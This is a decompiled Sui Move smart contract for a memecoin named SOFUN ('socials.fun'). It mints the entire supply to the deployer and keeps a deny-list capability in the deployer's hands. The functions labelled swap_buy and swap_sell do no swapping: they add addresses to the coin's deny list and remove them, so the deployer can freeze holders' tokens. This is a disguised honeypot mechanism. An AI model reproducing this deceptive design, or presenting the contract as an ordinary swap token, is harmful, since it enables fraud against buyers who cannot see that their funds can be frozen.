module 0xde25856f826411ea380f24081d86ed9913864a398b2b73d3601ffee7a06ea0f5::sofun {
    struct SOFUN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SOFUN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SOFUN>(arg0, 9, b"SOFUN", b"socials.fun", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmScPnATQ3Xo19FMFuUqgiePZ9Dx4pUDZgS4X7dZjJnQ7f"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SOFUN>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SOFUN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SOFUN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SOFUN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOFUN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SOFUN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOFUN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SOFUN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

